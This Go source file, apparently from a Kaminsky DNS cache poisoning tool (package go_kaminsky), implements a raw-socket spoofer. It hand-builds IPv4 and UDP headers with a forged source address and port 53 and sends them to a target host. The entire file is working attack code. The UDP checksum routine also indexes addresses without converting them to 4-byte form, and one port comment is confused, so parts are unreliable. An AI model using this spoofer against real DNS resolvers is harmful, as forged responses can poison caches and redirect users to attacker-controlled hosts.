package go_kaminsky

import (
	"encoding/binary"
	"net"
	"syscall"
)

const (
	ipHeaderBytes  = 20
	udpHeaderBytes = 8
)

// Spoofer handles creation and sending of spoofed UDP/IP packets
type Spoofer struct {
	fd          int
	spoofedPort uint16
	targetPort  uint16
	spoofedAddr net.IP
	targetAddr  net.IP
	ipTemplate  []byte
	payloadSize int
}

// NewSpoofer creates a new spoofer instance
func NewSpoofer(spoofedAddr, targetAddr net.IP, payloadSize int) (*Spoofer, error) {
	// Create raw socket
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		return nil, err
	}

	// Set socket options to include header
	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		syscall.Close(fd)
		return nil, err
	}

	// Pre-allocate IP packet template
	ipTemplate := make([]byte, ipHeaderBytes)

	// Populate IP header template
	ipTemplate[0] = 0x45                       // Version (4) and IHL (5)
	ipTemplate[1] = 0x00                       // DSCP and ECN
	ipTemplate[6] = 0x40                       // Flags (Don't Fragment)
	ipTemplate[7] = 0x00                       // Fragment Offset
	ipTemplate[8] = 0x40                       // TTL (64)
	ipTemplate[9] = 0x11                       // Protocol (UDP)
	copy(ipTemplate[12:16], spoofedAddr.To4()) // Source IP
	copy(ipTemplate[16:20], targetAddr.To4())  // Destination IP

	return &Spoofer{
		fd:          fd,
		spoofedPort: 53, // Standard DNS server port
		targetPort:  53, // Changed: Use standard DNS client port instead of 33333
		spoofedAddr: spoofedAddr,
		targetAddr:  targetAddr,
		ipTemplate:  ipTemplate,
		payloadSize: payloadSize,
	}, nil
}

// Close closes the underlying socket
func (s *Spoofer) Close() error {
	return syscall.Close(s.fd)
}

// SendBytes sends the provided payload bytes in a spoofed UDP/IP packet
func (s *Spoofer) SendBytes(payload []byte) error {
	// Prepare UDP header and payload
	udpLength := uint16(len(payload) + udpHeaderBytes)
	packet := make([]byte, udpHeaderBytes+len(payload))

	// UDP Header
	binary.BigEndian.PutUint16(packet[0:2], s.spoofedPort) // Source port
	binary.BigEndian.PutUint16(packet[2:4], s.targetPort)  // Destination port
	binary.BigEndian.PutUint16(packet[4:6], udpLength)     // Length
	binary.BigEndian.PutUint16(packet[6:8], 0)             // Checksum (initially 0)

	// Copy payload
	copy(packet[udpHeaderBytes:], payload)

	// Calculate UDP checksum
	udpChecksum := calculateUDPChecksum(packet, s.spoofedAddr, s.targetAddr)
	binary.BigEndian.PutUint16(packet[6:8], udpChecksum)

	// Prepare final IP packet
	ipPacket := make([]byte, ipHeaderBytes+len(packet))
	copy(ipPacket[:ipHeaderBytes], s.ipTemplate)

	// Set IP total length
	totalLength := uint16(len(ipPacket))
	binary.BigEndian.PutUint16(ipPacket[2:4], totalLength)

	// Copy UDP packet
	copy(ipPacket[ipHeaderBytes:], packet)

	// Calculate IP header checksum
	ipChecksum := calculateIPChecksum(ipPacket[:ipHeaderBytes])
	binary.BigEndian.PutUint16(ipPacket[10:12], ipChecksum)

	// Prepare destination address for syscall
	addr := syscall.SockaddrInet4{
		Port: 0, // Not used for raw sockets
	}
	copy(addr.Addr[:], s.targetAddr.To4())

	// Send the packet
	return syscall.Sendto(s.fd, ipPacket, 0, &addr)
}

// calculateIPChecksum calculates the IP header checksum
func calculateIPChecksum(header []byte) uint16 {
	var sum uint32
	for i := 0; i < len(header); i += 2 {
		sum += uint32(header[i])<<8 | uint32(header[i+1])
	}
	sum = (sum >> 16) + (sum & 0xffff)
	sum = sum + (sum >> 16)
	return ^uint16(sum)
}

// calculateUDPChecksum calculates the UDP checksum including the pseudo-header
func calculateUDPChecksum(udpPacket []byte, srcIP, dstIP net.IP) uint16 {
	var sum uint32

	// Pseudo-header
	sum += uint32(srcIP[0])<<8 | uint32(srcIP[1])
	sum += uint32(srcIP[2])<<8 | uint32(srcIP[3])
	sum += uint32(dstIP[0])<<8 | uint32(dstIP[1])
	sum += uint32(dstIP[2])<<8 | uint32(dstIP[3])
	sum += uint32(syscall.IPPROTO_UDP)
	sum += uint32(len(udpPacket))

	// UDP packet
	for i := 0; i < len(udpPacket)-1; i += 2 {
		sum += uint32(udpPacket[i])<<8 | uint32(udpPacket[i+1])
	}
	if len(udpPacket)%2 == 1 {
		sum += uint32(udpPacket[len(udpPacket)-1]) << 8
	}

	// Fold 32-bit sum into 16 bits
	for sum > 0xffff {
		sum = (sum >> 16) + (sum & 0xffff)
	}

	return ^uint16(sum)
}
